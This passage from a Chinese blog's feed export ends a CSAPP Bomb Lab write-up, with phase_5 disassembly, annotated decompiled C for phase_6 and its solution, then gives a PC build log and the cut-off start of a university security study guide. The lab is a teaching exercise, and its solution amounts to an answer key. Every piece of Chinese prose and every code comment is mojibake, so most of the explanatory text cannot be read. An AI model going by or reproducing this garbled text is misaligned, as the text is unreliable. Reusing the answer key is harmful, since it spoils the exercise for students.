class="hljs-number">0</span>x<span class="hljs-number">0</span>,<span class="hljs-number">0</span>x<span class="hljs-number">16</span>(%rsp)<br>  <span class="hljs-attribute">4010b3</span>:be <span class="hljs-number">5</span>e <span class="hljs-number">24</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">40245</span>e,%esi<br>  <span class="hljs-attribute">4010b8</span>:<span class="hljs-number">48</span> <span class="hljs-number">8</span>d <span class="hljs-number">7</span>c <span class="hljs-number">24</span> <span class="hljs-number">10</span>       lea    <span class="hljs-number">0</span>x<span class="hljs-number">10</span>(%rsp),%rdi<br>  <span class="hljs-attribute">4010bd</span>:e<span class="hljs-number">8</span> <span class="hljs-number">76</span> <span class="hljs-number">02</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">401338</span> &lt;strings_not_equal&gt;<br>  <span class="hljs-attribute">4010c2</span>:<span class="hljs-number">85</span> c<span class="hljs-number">0</span>                test   %eax,%eax<br>  <span class="hljs-attribute">4010c4</span>:<span class="hljs-number">74</span> <span class="hljs-number">13</span>                je     <span class="hljs-number">4010</span>d<span class="hljs-number">9</span> &lt;phase_<span class="hljs-number">5</span>+<span class="hljs-number">0</span>x<span class="hljs-number">77</span>&gt;<br>  <span class="hljs-attribute">4010c6</span>:e<span class="hljs-number">8</span> <span class="hljs-number">6</span>f <span class="hljs-number">03</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40143</span>a &lt;explode_bomb&gt;<br>  <span class="hljs-attribute">4010cb</span>:<span class="hljs-number">0</span>f <span class="hljs-number">1</span>f <span class="hljs-number">44</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       nopl   <span class="hljs-number">0</span>x<span class="hljs-number">0</span>(%rax,%rax,<span class="hljs-number">1</span>)<br>  <span class="hljs-attribute">4010d0</span>:eb <span class="hljs-number">07</span>                jmp    <span class="hljs-number">4010</span>d<span class="hljs-number">9</span> &lt;phase_<span class="hljs-number">5</span>+<span class="hljs-number">0</span>x<span class="hljs-number">77</span>&gt;<br>  <span class="hljs-attribute">4010d2</span>:b<span class="hljs-number">8</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">0</span>,%eax#eaxç½®ä¸º<span class="hljs-number">0</span><br>  <span class="hljs-attribute">4010d7</span>:eb b<span class="hljs-number">2</span>                jmp    <span class="hljs-number">40108</span>b &lt;phase_<span class="hljs-number">5</span>+<span class="hljs-number">0</span>x<span class="hljs-number">29</span>&gt;<br>  <span class="hljs-attribute">4010d9</span>:<span class="hljs-number">48</span> <span class="hljs-number">8</span>b <span class="hljs-number">44</span> <span class="hljs-number">24</span> <span class="hljs-number">18</span>       mov    <span class="hljs-number">0</span>x<span class="hljs-number">18</span>(%rsp),%rax<br>  <span class="hljs-attribute">4010de</span>:<span class="hljs-number">64</span> <span class="hljs-number">48</span> <span class="hljs-number">33</span> <span class="hljs-number">04</span> <span class="hljs-number">25</span> <span class="hljs-number">28</span> <span class="hljs-number">00</span> xor    %fs:<span class="hljs-number">0</span>x<span class="hljs-number">28</span>,%rax<br>  <span class="hljs-attribute">4010e5</span>:<span class="hljs-number">00</span> <span class="hljs-number">00</span> <br>  <span class="hljs-attribute">4010e7</span>:<span class="hljs-number">74</span> <span class="hljs-number">05</span>                je     <span class="hljs-number">4010</span>ee &lt;phase_<span class="hljs-number">5</span>+<span class="hljs-number">0</span>x<span class="hljs-number">8</span>c&gt;<br>  <span class="hljs-attribute">4010e9</span>:e<span class="hljs-number">8</span> <span class="hljs-number">42</span> fa ff ff       callq  <span class="hljs-number">400</span>b<span class="hljs-number">30</span> &lt;__stack_chk_fail@plt&gt;<br>  <span class="hljs-attribute">4010ee</span>:<span class="hljs-number">48</span> <span class="hljs-number">83</span> c<span class="hljs-number">4</span> <span class="hljs-number">20</span>          add    $<span class="hljs-number">0</span>x<span class="hljs-number">20</span>,%rsp<br>  <span class="hljs-attribute">4010f2</span>:<span class="hljs-number">5</span>b                   pop    %rbx<br>  <span class="hljs-attribute">4010f3</span>:c<span class="hljs-number">3</span>                   retq   <br></code></pre></td></tr></table></figure><h1 id="phase-6"><a href="#phase-6" class="headerlink" title="phase_6"></a>phase_6</h1><p>æ‹–è¿›ida F5å¾—åˆ°Cè¯­è¨€ä»£ç ï¼Œä¸‹é¢æ˜¯æˆ‘åŠ äº†æ³¨é‡Šçš„ç‰ˆæœ¬ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">phase_6</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *s)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> v1; <span class="hljs-comment">// edi</span><br>  <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// ebx</span><br>  <span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> v3; <span class="hljs-comment">// edi</span><br>  _DWORD *v4; <span class="hljs-comment">// esi</span><br>  <span class="hljs-keyword">int</span> j; <span class="hljs-comment">// ebx</span><br>  <span class="hljs-keyword">int</span> v6; <span class="hljs-comment">// esi</span><br>  <span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> v7; <span class="hljs-comment">// edi</span><br>  <span class="hljs-keyword">int</span> v8; <span class="hljs-comment">// eax</span><br>  <span class="hljs-keyword">int</span> v9; <span class="hljs-comment">// esi</span><br>  <span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> v10; <span class="hljs-comment">// edi</span><br>  <span class="hljs-keyword">int</span> result; <span class="hljs-comment">// eax</span><br>  <span class="hljs-keyword">int</span> v12; <span class="hljs-comment">// [esp+0h] [ebp-58h]</span><br>  <span class="hljs-keyword">int</span> v13; <span class="hljs-comment">// [esp+4h] [ebp-54h]</span><br>  <span class="hljs-keyword">int</span> v14; <span class="hljs-comment">// [esp+8h] [ebp-50h]</span><br>  <span class="hljs-keyword">int</span> v15; <span class="hljs-comment">// [esp+Ch] [ebp-4Ch]</span><br>  <span class="hljs-keyword">int</span> v16; <span class="hljs-comment">// [esp+24h] [ebp-34h]</span><br>  <span class="hljs-keyword">int</span> v17[<span class="hljs-number">6</span>]; <span class="hljs-comment">// [esp+28h] [ebp-30h]</span><br>  <span class="hljs-keyword">int</span> v18[<span class="hljs-number">6</span>]; <span class="hljs-comment">// [esp+40h] [ebp-18h]</span><br><br>  read_six_numbers(s, (<span class="hljs-keyword">int</span>)v18);<span class="hljs-comment">//è¯»å…¥å…­ä¸ªæ•°å­—</span><br>  v1 = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-keyword">do</span><br>  &#123;<br>    <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)(v18[v1] - <span class="hljs-number">1</span>) &gt; <span class="hljs-number">5</span> ) <span class="hljs-comment">//è¿™å…­ä¸ªæ•°å­—å¿…é¡»éƒ½æ˜¯å°äºç­‰äº6</span><br>      explode_bomb(v12, v13, v14, v15);<br>    <span class="hljs-keyword">for</span> ( i = v1 + <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">5</span>; ++i )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( v18[v1] == v18[i] )<span class="hljs-comment">//ä¸¤ä¸¤ä¸ç›¸ç­‰ï¼Œä¹Ÿå³æ˜¯1~6å„å‡ºç°ä¸€ä¸ª</span><br>        explode_bomb(v12, v13, v14, v15);<br>    &#125;<br>    ++v1;<br>  &#125;<br>  <span class="hljs-keyword">while</span> ( v1 &lt;= <span class="hljs-number">5</span> );<br>  <span class="hljs-comment">// å…­ä¸ªæ•°å­—éƒ½æ˜¯å°äºç­‰äº6ä¸”äº’ä¸ç›¸ç­‰</span><br>  v3 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">do</span><br>  &#123;<br>    v4 = &amp;node1;<span class="hljs-comment">//v4æ˜¯ä¸€ä¸ªnode1ç»“æ„ä½“çš„åœ°å€</span><br>    <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">1</span>; j &lt; v18[v3]; ++j )<br>      v4 = (_DWORD *)v4[<span class="hljs-number">2</span>];<span class="hljs-comment">//v4[2]å­˜å‚¨çš„æ˜¯æŒ‡å‘ä¸‹ä¸€ä¸ªç»“æ„ä½“çš„æŒ‡é’ˆ</span><br>    v17[v3++] = (<span class="hljs-keyword">int</span>)v4;<span class="hljs-comment">//v17å­˜å‚¨æ’åºåçš„ç»“æ„ä½“é“¾è¡¨çš„åœ°å€</span><br>  &#125;<br>  <span class="hljs-keyword">while</span> ( v3 &lt;= <span class="hljs-number">5</span> );<br><br>  v6 = v17[<span class="hljs-number">0</span>];<br>  v16 = v17[<span class="hljs-number">0</span>];<br>  v7 = <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">do</span><br>  &#123;<br>    v8 = v17[v7];<br>    *(_DWORD *)(v6 + <span class="hljs-number">8</span>) = v8;<span class="hljs-comment">// +0  +4  +8åˆ†åˆ«å¯¹åº”ï¼šå‚¨å­˜çš„å€¼     åºå·     ä¸‹ä¸€ä¸ªç»“æ„ä½“çš„åœ°å€ï¼Œè¿™é‡Œæ˜¯æŠŠæ’åºåçš„ç»“æ„ä½“é“¾æ¥èµ·æ¥</span><br>    v6 = v8;<br>    ++v7;<br>  &#125;<br>  <span class="hljs-keyword">while</span> ( v7 &lt;= <span class="hljs-number">5</span> );<br><br>  *(_DWORD *)(v8 + <span class="hljs-number">8</span>) = <span class="hljs-number">0</span>;<span class="hljs-comment">//æœ€åä¸€ä¸ªèŠ‚ç‚¹ï¼ŒæŒ‡å‘çš„åœ°å€æ˜¯0</span><br>  v9 = v16;<br>  v10 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">do</span><br>  &#123;<br>    result = *(_DWORD *)v9;<br>    <span class="hljs-keyword">if</span> ( *(_DWORD *)v9 &lt; **(_DWORD **)(v9 + <span class="hljs-number">8</span>) )<span class="hljs-comment">//æ’åºåçš„ç»“æ„ä½“é“¾è¡¨éœ€è¦æ»¡è¶³ï¼šå­˜å‚¨çš„å€¼æ˜¯ä»å¤§åˆ°å°æ’åº</span><br>      explode_bomb(v12, v13, v14, v15);<br>    v9 = *(_DWORD *)(v9 + <span class="hljs-number">8</span>);<br>    ++v10;<br>  &#125;<br>  <span class="hljs-keyword">while</span> ( v10 &lt;= <span class="hljs-number">4</span> );<br><br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>è§‚å¯Ÿnodeç»“æ„ä½“çš„ç‰¹ç‚¹ï¼Œå‘ç°node[0]è¡¨ç¤ºå­˜å‚¨çš„å€¼ï¼Œnode[1]è¡¨ç¤ºnodeç¼–å·ï¼Œnode[2] å­˜å‚¨ä¸‹ä¸€ä¸ªnodeçš„åœ°å€</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs maxima">.data:<span class="hljs-number">0804B254</span> node3           db  2Dh ; -<br>.data:<span class="hljs-number">0804B255</span>                 db    <span class="hljs-number">1</span><br>.data:<span class="hljs-number">0804B256</span>                 db    <span class="hljs-number">0</span><br>.data:<span class="hljs-number">0804B257</span>                 db    <span class="hljs-number">0</span><br>.data:<span class="hljs-number">0804B258</span>                 db    <span class="hljs-number">3</span><br>.data:<span class="hljs-number">0804B259</span>                 db    <span class="hljs-number">0</span><br>.data:<span class="hljs-number">0804B25A</span>                 db    <span class="hljs-number">0</span><br>.data:<span class="hljs-number">0804B25B</span>                 db    <span class="hljs-number">0</span><br>.data:<span class="hljs-number">0804B25C</span>                 db  48h ; H<br>.data:<span class="hljs-number">0804B25D</span>                 db <span class="hljs-number">0B2h</span><br>.data:<span class="hljs-number">0804B25E</span>                 db    <span class="hljs-number">4</span><br>.data:<span class="hljs-number">0804B25F</span>                 db    <span class="hljs-number">8</span><br>.data:<span class="hljs-number">0804B260</span>                 public node2<br>.data:<span class="hljs-number">0804B260</span> node2           db <span class="hljs-number">0D5h</span><br>.data:<span class="hljs-number">0804B261</span>                 db    <span class="hljs-number">2</span><br>.data:<span class="hljs-number">0804B262</span>                 db    <span class="hljs-number">0</span><br>.data:<span class="hljs-number">0804B263</span>                 db    <span class="hljs-number">0</span><br>.data:<span class="hljs-number">0804B264</span>                 db    <span class="hljs-number">2</span><br>.data:<span class="hljs-number">0804B265</span>                 db    <span class="hljs-number">0</span><br>.data:<span class="hljs-number">0804B266</span>                 db    <span class="hljs-number">0</span><br>.data:<span class="hljs-number">0804B267</span>                 db    <span class="hljs-number">0</span><br>.data:<span class="hljs-number">0804B268</span>                 db  54h ; T<br>.data:<span class="hljs-number">0804B269</span>                 db <span class="hljs-number">0B2h</span><br>.data:<span class="hljs-number">0804B26A</span>                 db    <span class="hljs-number">4</span><br>.data:<span class="hljs-number">0804B26B</span>                 db    <span class="hljs-number">8</span><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬è¾“å…¥çš„æ•°å­—å°†ä¼šæŠŠç»“æ„ä½“è¿›è¡Œæ’åºï¼Œæ’åºç»“æœæœ€ç»ˆéœ€è¦æ»¡è¶³çš„è¦æ±‚æ˜¯ï¼Œç»“æ„ä½“å­˜å‚¨çš„å€¼å¿…é¡»è¦ä»å¤§åˆ°å°æ’åˆ—ï¼Œå› æ­¤æˆ‘ä»¬æ‰¾å‡ºæ‰€æœ‰çš„nodeå­˜å‚¨çš„å€¼å³å¯</p><table><thead><tr><th>ç»“æ„ä½“ç¼–å·</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th></tr></thead><tbody><tr><td>å‚¨å­˜å€¼</td><td>0xFD</td><td>0x2D5</td><td>0x12D</td><td>0x3E5</td><td>0xD4</td><td>0x1B0</td></tr><tr><td>æ’åºåç¼–å·</td><td>5</td><td>2</td><td>4</td><td>1</td><td>6</td><td>3</td></tr></tbody></table><p>4 2 6 3 1 5</p>]]></content>
    
    
    <categories>
      
      <category>CSAPP</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>è£…æœºè®°å½•</title>
    <link href="/p/beacb7b3/"/>
    <url>/p/beacb7b3/</url>
    
    <content type="html"><![CDATA[<h1 id="å™¨æé€‰è´­"><a href="#å™¨æé€‰è´­" class="headerlink" title="å™¨æé€‰è´­"></a>å™¨æé€‰è´­</h1><ul><li>CPUï¼šé”é¾™5 5600x</li><li>ä¸»æ¿ï¼šASUS TUF GAMING B550M-PLUS WIFI II </li><li>æ˜¾å¡ï¼šROG 2080 super </li><li>å†…å­˜ï¼šè‹±ç¿è¾¾ 16GB</li><li>ssdï¼šä¸‰æ˜Ÿ980Pro 1TB</li><li>hddï¼šDell SATA 7200 4TB</li><li>æ•£çƒ­ï¼šç„å†°400 V</li><li>æœºç®±ï¼šå…ˆé©¬å‰‘é­”k3</li><li>æ˜¾ç¤ºå™¨ï¼šLG 4k 550UL</li><li>ç”µæºï¼šé‘«è°·å…¨æ¨¡ç»„750wé‡‘ç‰Œç”µæº</li></ul><h1 id="å·¥å…·"><a href="#å·¥å…·" class="headerlink" title="å·¥å…·"></a>å·¥å…·</h1><ul><li>èºä¸åˆ€å¤§å°å„ä¸€æŠŠï¼Œæ¢…èŠ±å£</li><li>æ‰‹å¥—ä¸€åªï¼Œé˜²æ­¢åˆ’ä¼¤</li></ul><h1 id="å®‰è£…è¿‡ç¨‹"><a href="#å®‰è£…è¿‡ç¨‹" class="headerlink" title="å®‰è£…è¿‡ç¨‹"></a>å®‰è£…è¿‡ç¨‹</h1><ul><li>æ¿u<ul><li>æŒ‰ç…§AM4ä¸»æ¿çš„CPUå®‰è£…æ–¹å¼ï¼Œå®‰è£…CPU</li><li>å¸ä¸‹ä¸»æ¿ä¸ŠåŸè£…çš„æ•£çƒ­å¥—ä»¶</li><li>æ¶‚ä¸Šæ•£çƒ­ç¡…è„‚</li><li>å®‰è£…ä¸Šç„å†°400 Væ•£çƒ­ï¼ˆæ•£çƒ­é“œç®¡+é£æ‰‡ï¼‰ã€‚è¿™é‡Œè¦æ³¨æ„ç„å†°400æœ‰å¥½å‡ ä»£ï¼Œè¦æ‰¾å¯¹åº”ä»£ã€å¯¹åº”ä¸»æ¿ç±»å‹çš„å®‰è£…è¯´æ˜</li></ul></li><li>æŠŠä¸»æ¿å®‰è£…åˆ°æœºç®±ä¸Šè¿›è¡Œå›ºå®š</li><li>å®‰è£…å†…å­˜æ¡ã€‚å†…å­˜å®‰è£…ä¼˜å…ˆæ’2ã€4æ§½ï¼Œç„¶åæ˜¯1ã€3æ§½</li><li>å®‰è£…m2æ¥å£çš„ssdã€‚æ³¨æ„è¦å…ˆå®‰è£…èºæŸ±ï¼Œç„¶åæ’å…¥ssdï¼Œç„¶åç”¨èºä¸å›ºå®šã€‚æˆ‘åœ¨è¿™é‡Œå…ˆæ²¡æœ‰å®‰è£…èºæŸ±ï¼Œç›´æ¥æ’å…¥ssdç„¶åç”¨èºä¸å›ºå®šï¼Œå‘ç°å·¦å³é«˜ä½ä¸ä¸€ï¼Œè¸©å‘äº†</li><li>æ˜¾å¡<ul><li>ROG 2080 superå¤ªå¤§å¤ªé‡äº†ï¼Œå› æ­¤éœ€è¦æå‰è®¡ç®—æœºç®±æ˜¯ä¸æ˜¯èƒ½æ”¾ä¸‹</li><li>æ‰£æ‰æœºç®±èƒŒé¢çš„æŒ¡æ¿ï¼Œç»™æ˜¾å¡æ¥å£å¤„è…¾å‡ºä½ç½®</li><li>å°†æ˜¾å¡å¡åœ¨ä¸»æ¿ä¸Šçš„pcieæ§½ï¼Œå¬è§ å’” ä¸€å£°è¯´æ˜å®‰è£…æˆåŠŸ<ul><li>è¿™é‡Œæ³¨æ„ä¸»æ¿ä¸Šè™½ç„¶å‘¦ä¸¤ä¸ªpcieæ§½ï¼Œä½†æ˜¯é è¿‘CPUçš„æ‰æ˜¯æ»¡é€Ÿçš„</li></ul></li><li>ç”¨èºä¸å°†æ˜¾å¡å›ºå®š</li></ul></li><li>hdd<ul><li>å¸ä¸‹æœºç®±hddæ§½çš„èºä¸ï¼Œæ‹¿å‡ºhddæ§½ï¼Œå°†hddæ’å…¥ï¼Œç„¶åç”¨èºä¸å°†hddå›ºå®šåœ¨hddæ§½ä¸­</li><li>å°†hddæ§½æ”¾å›æœºç®±ï¼Œç„¶åç”¨èºä¸å›ºå®šåœ¨æœºç®±å¤„</li></ul></li><li>æ¥çº¿<ul><li>å°†ä¸»æ¿ä¾›ç”µã€CPUä¾›ç”µã€SATAã€æ˜¾å¡ç­‰ä¾›ç”µçº¿å…ˆæ’å¥½ä¸€å¤´ï¼Œç„¶åæ’åˆ°ç”µæºå¯¹åº”çš„çº¿å£å¤„ï¼Œè¿™é‡Œæ¨èå…¨æ¨¡ç»„ç”µæºï¼Œæ¥çº¿æ¯”è¾ƒæ–¹ä¾¿</li><li>æ³¨æ„åˆ°æœºç®±è‡ªå¸¦çš„å¼€æœºçº¿ï¼ˆF_PANELï¼‰æ˜¯å¾ˆéš¾æ¥çš„ï¼Œå»ºè®®å…ˆæŠŠé‚£å‡ æ¡çº¿æ¥äº†å†æ’æ˜¾å¡ï¼Œä¸ç„¶æ˜¾å¡å¤ªå¤§æŒ¡ä½æ‰‹å¾ˆéš¾æ’</li></ul></li><li>ç”µæº<ul><li>å°†ç”µæºå›ºå®šåœ¨æœºç®±å¤„ï¼Œç”µæºçš„é£æ‰‡æœ‰ä¸Šä¸‹ä¹‹åˆ†ï¼Œè¿™é‡Œéœ€è¦æ³¨æ„ä¸€ä¸‹ï¼Œæˆ‘çš„æ˜¯å¾€ä¸‹çš„</li><li>æ­¤æ—¶ä½ çš„ç”µæºæœ‰è®¸å¤šçº¿äº†ï¼Œè¦æ³¨æ„ç†çº¿è®©æœºç®±å†…éƒ¨æ•´é½åˆ’ä¸€</li></ul></li></ul><h1 id="ç³»ç»Ÿåˆå§‹åŒ–"><a href="#ç³»ç»Ÿåˆå§‹åŒ–" class="headerlink" title="ç³»ç»Ÿåˆå§‹åŒ–"></a>ç³»ç»Ÿåˆå§‹åŒ–</h1><ul><li>è£…ç³»ç»Ÿã€‚ä½¿ç”¨Uç›˜ + <a href="https://rufus.ie/zh/">rufus</a>çƒ§ä¸ªç³»ç»Ÿè¿›å»ï¼Œç„¶ååœ¨BIOSè®¾ç½®ä¸€ä¸‹Uç›˜å¯åŠ¨ä»è€Œå®‰è£…ç³»ç»Ÿ<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs gauss">Rufusæ˜¯ä¸€ä¸ªå¸®åŠ©æ ¼å¼åŒ–å’Œåˆ›å»ºå¯å¯åŠ¨USBé—ªå­˜é©±åŠ¨å™¨çš„å·¥å…·ï¼Œå¦‚USBé’¥åŒ™/è½¯ç›˜ã€è®°å¿†æ£’ç­‰ã€‚<br><br>åœ¨å¦‚ä¸‹åœºæ™¯ä¸­ä¼šéå¸¸æœ‰ç”¨ï¼š<br><br>ä½ éœ€è¦æŠŠä¸€äº›å¯å¼•å¯¼çš„ISOæ ¼å¼çš„é•œåƒï¼ˆWindowsï¼ŒLinuxï¼ŒUEFIç­‰ï¼‰åˆ›å»ºæˆUSBå®‰è£…ç›˜çš„æ—¶å€™<br>ä½ éœ€è¦ä½¿ç”¨ä¸€ä¸ªè¿˜æ²¡æœ‰å®‰è£…æ“ä½œç³»ç»Ÿçš„è®¾å¤‡çš„æ—¶å€™<br>ä½ éœ€è¦ä»<span class="hljs-keyword">DOS</span>ç³»ç»Ÿåˆ·å†™BIOSæˆ–è€…å…¶ä»–å›ºä»¶çš„æ—¶å€™<br>ä½ éœ€è¦è¿è¡Œä¸€ä¸ªåº•å±‚çš„å·¥å…·çš„æ—¶å€™<br>Rufus éº»é›€è™½å°ï¼Œäº”è„ä¿±å…¨ï¼Œä½“ç§¯è™½å°ï¼ŒåŠŸèƒ½å…¨é¢ï¼Œæä¾›äº†ä¸€åˆ‡ä½ æ‰€éœ€è¦çš„åŠŸèƒ½ã€‚<br></code></pre></td></tr></table></figure></li><li>æ–°ä¸»æœºçš„é©±åŠ¨éƒ½æ˜¯ç¼ºå°‘çš„ï¼Œå¼€æœºä¹‹åè¦å®‰è£…è“ç‰™ã€WiFiç­‰é©±åŠ¨ï¼Œå»ºè®®ä½¿ç”¨é²å¤§å¸ˆ</li><li>ä½¿ç”¨neofetchæŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯</li></ul><pre><code class="hljs">$ neofetch                                ..,   user@DESKTOP-0MMJKEF                    ....,,:;+ccllll   --------------------      ...,,+:;  cllllllllllllllllll   OS: Windows 10 â–¡â–¡Òµâ–¡â–¡ LTSC x86_64,cclllllllllll  lllllllllllllllllll   Host: ASUSllllllllllllll  lllllllllllllllllll   Kernel: 10.0.19044llllllllllllll  lllllllllllllllllll   Uptime: 2 days, 19 minsllllllllllllll  lllllllllllllllllll   Packages: 2 (scoop)llllllllllllll  lllllllllllllllllll   Shell: bash 5.1.16llllllllllllll  lllllllllllllllllll   Resolution: 3840x2160                                      DE: Aerollllllllllllll  lllllllllllllllllll   Terminal: Windows Terminalllllllllllllll  lllllllllllllllllll   CPU: AMD Ryzen 5 5600X (12) @ 3.700GHzllllllllllllll  lllllllllllllllllll   GPU: Captionllllllllllllll  lllllllllllllllllll   GPU: NVIDIA GeForce RTX 2080 SUPERllllllllllllll  lllllllllllllllllll   GPU`&#39;ccllllllllll  lllllllllllllllllll   Memory: 12267MiB / 16270MiB       `&#39; \*::  :ccllllllllllllllll                       ````&#39;&#39;*::cll                                 ``</code></pre><p>è‡³æ­¤ï¼Œå°±è£…æœºå®Œæˆäº†ï¼Œä¸€æ¬¡ç‚¹äº®çºªå¿µï¼š</p><p><img src="/image/diycomputer.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>å·¥å…·ä½¿ç”¨</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å®‰å¾½å¤§å­¦ä¿¡æ¯å®‰å…¨ä¸“ä¸šæœ¬ç§‘ç”Ÿæ”»ç•¥</title>
    <link href="/p/ecbd1625/"/>
    <url>/p/ecbd1625/</url>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/LaPhilosophie/AHU-CyberSecurity">å®‰å¾½å¤§å­¦ä¿¡æ¯å®‰å…¨ä¸“ä¸šæœ¬ç§‘ç”Ÿæ”»ç•¥ï¼šGithubé“¾æ¥</a></p><h1 id="æ¬¢è¿æ¥åˆ°å®‰å¾½å¤§å­¦ä¿¡æ¯å®‰å…¨ä¸“ä¸š"><a href="#æ¬¢è¿æ¥åˆ°å®‰å¾½å¤§å­¦ä¿¡æ¯å®‰å…¨ä¸“ä¸š" class="headerlink" title="æ¬¢è¿æ¥åˆ°å®‰å¾½å¤§å­¦ä¿¡æ¯å®‰å…¨ä¸“ä¸š"></a>æ¬¢è¿æ¥åˆ°å®‰å¾½å¤§å­¦ä¿¡æ¯å®‰å…¨ä¸“ä¸š</h1><p>å€Ÿç”¨ <a href="https://survivesjtu.gitbook.io/survivesjtumanual/li-zhi-pian/huan-ying-lai-dao-shang-hai-jiao-tong-da-xue">SurviveSJTUManual</a> çš„èµ·å§‹ç« èŠ‚ï¼Œ<strong>åœ¨æœ¬repoçš„å¼€å§‹ï¼Œæˆ‘ä¸å¾—ä¸é—æ†¾åœ°å‘Šè¯‰å¤§å®¶ä¸€ä¸ªæ¶ˆæ¯ï¼šå›½å†…ç»å¤§éƒ¨åˆ†å¤§å­¦çš„æœ¬ç§‘æ•™å­¦ï¼Œä¸æ˜¯æ¿’ä¸´å´©æºƒï¼Œè€Œæ˜¯æ—©å·²å´©æºƒ</strong>ã€‚</p><p>æœ‰äº›åŒå­¦æ€ç»´ä¸€ç›´åœç•™åœ¨é«˜è€ƒç»“æŸé‚£ä¸€åˆ»ï¼Œè¿›å…¥å¤§å­¦ä¾¿æ­¢æ­¥ä¸å‰ï¼›æœ‰äº›åŒå­¦ç¼ºä¹åˆç†è¯¦å®çš„å­¦ä¹ è·¯çº¿ï¼Œä¸æ–­è¸©å‘å¤±å»å­¦ä¹ CyberSecurityçš„å…´è¶£ï¼›æœ‰äº›åŒå­¦åªä¼šç–¯ç‹‚å·GPAï¼Œè¡¨é¢ä¸Šæˆä¸ºäº†æ¯é—¨ä¸“ä¸šè¯¾éƒ½åœ¨90åˆ†ä»¥ä¸Šçš„æ‰€è°“â€œä¼˜ç­‰å­¦ç”Ÿâ€ï¼Œä½†å´æ˜¯ä¸ªè¿æœ€åŸºæœ¬çš„å®‰å…¨æŠ€èƒ½ï¼ˆæ¯”å¦‚å‘½ä»¤è¡Œä¸‹ <code>gdb</code> è°ƒè¯•ã€<code>elf</code> æ–‡ä»¶åˆ†æã€ç¼“å†²åŒºæº¢å‡ºåŸç†ï¼‰éƒ½ä¸æ‡‚çš„èœé¸Ÿï¼Œåœ¨è™šå‡çš„ GPA 